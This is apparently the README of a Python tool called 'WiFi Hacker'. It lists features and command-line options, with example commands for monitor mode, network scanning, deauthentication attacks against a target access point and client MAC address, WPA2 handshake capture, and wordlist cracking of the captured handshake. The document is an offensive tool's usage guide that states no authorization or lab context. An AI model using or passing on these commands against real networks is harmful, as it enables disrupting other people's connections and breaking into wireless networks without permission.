# WiFi Hacker

WiFi Hacker is a tool for performing various WiFi network attacks including network scanning, deauthentication attacks, and WPA2 handshake capturing and cracking.

## Features
- Network scanning
- Deauthentication attack
- WPA2 handshake capturing
- WPA2 handshake cracking

## Requirements
- Python 3.x
- Scapy
- argparse
- subprocess

## Installation
Install the required packages:
```sh
pip install -r requirements.txt
Usage: wifi_hacker.py [-h] -i INTERFACE [-H HANDSHAKE] [-w WORDLIST] [-s {monitor,managed}] [-S] [-d] [--bssid BSSID] [--client CLIENT] [-a]

Options:
  -i, --interface          Network interface to use for capturing handshake
  -H, --handshake          File to save the captured handshake
  -w, --wordlist           Wordlist file to use for cracking the handshake
  -s, --switch             Switch interface mode (monitor/managed)
  -S, --scan               Scan for available WiFi networks
  -d, --deauth             Perform deauth attack (requires --bssid and --client)
  --bssid BSSID            Target BSSID for deauth attack
  --client CLIENT          Target client MAC address for deauth attack
  -a, --auto               Automatic mode for capturing handshake

# Switch interface to monitor mode
python wifi_hacker.py -i wlan0 -s monitor

# Scan for networks
python wifi_hacker.py -i wlan0 -S

# Automatic mode for capturing handshake
python wifi_hacker.py -i wlan0 -a

# Perform deauth attack manually
python wifi_hacker.py -i wlan0 -d --bssid 00:11:22:33:44:55 --client AA:BB:CC:DD:EE:FF

# Crack WPA2 handshake
python wifi_hacker.py -i wlan0 -H handshake/00-11-22-33-44-55.cap -w wordlist.txt
